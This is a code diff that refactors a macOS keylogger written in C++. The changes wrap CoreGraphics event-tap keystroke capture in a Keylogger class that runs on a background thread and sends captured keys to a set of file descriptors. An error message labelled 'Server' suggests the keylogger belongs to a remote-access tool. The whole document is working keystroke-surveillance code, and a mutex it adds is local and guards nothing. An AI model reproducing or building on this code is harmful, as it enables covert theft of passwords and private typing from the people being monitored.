@@ -6,17 +6,13 @@
 #include <CoreFoundation/CoreFoundation.h>
 #include <Carbon/Carbon.h>
 
-CFRunLoopRef event_loop;
-std::vector<int> keylogfds;
+std::set<int> keylogfds;
 // only English character is count
 UniChar createStringForKey(CGKeyCode keyCode)
 {
     TISInputSourceRef currentKeyboard = TISCopyCurrentKeyboardInputSource();
-    CFDataRef layoutData = (CFDataRef)
-        TISGetInputSourceProperty(currentKeyboard,
-                                  kTISPropertyUnicodeKeyLayoutData);
-    const UCKeyboardLayout *keyboardLayout =
-        (const UCKeyboardLayout *)CFDataGetBytePtr(layoutData);
+    CFDataRef layoutData = (CFDataRef) TISGetInputSourceProperty(currentKeyboard, kTISPropertyUnicodeKeyLayoutData);
+    const UCKeyboardLayout *keyboardLayout = (const UCKeyboardLayout *)CFDataGetBytePtr(layoutData);
 
     UInt32 keysDown = 0;
     UniChar chars[4];
@@ -55,7 +51,7 @@ CGEventRef hookCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef even
     }
     return event;
 };
-void startKeylogHelper()
+void Keylogger::startKeylogHelper()
 {
     CFMachPortRef eventTap;
     CGEventMask eventMask;
@@ -72,21 +68,29 @@ void startKeylogHelper()
         std::cerr << "Server: failed to create event tap\n";
         exit(1);
     }
-    event_loop = CFRunLoopGetCurrent();
+    std::mutex m;
+    m.lock();
+    this->_event_loop = CFRunLoopGetCurrent();
 
     // Create a run loop source.
     runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
     
     // Add to the current run loop.
-    CFRunLoopAddSource(event_loop, runLoopSource, kCFRunLoopDefaultMode);
+    CFRunLoopAddSource(this->_event_loop, runLoopSource, kCFRunLoopDefaultMode);
     
     // Enable the event tap.
     CGEventTapEnable(eventTap, true);
     
     // Set it all running.
+    m.unlock();
     CFRunLoopRun();
 }
-void stopKeylogHelper()
+Keylogger::Keylogger()
 {
-    CFRunLoopStop(event_loop);
+    this->_keylogThread = std::thread(&Keylogger::startKeylogHelper, this);
+}
+Keylogger::~Keylogger()
+{
+    CFRunLoopStop(this->_event_loop);
+    this->_keylogThread.join();
 }
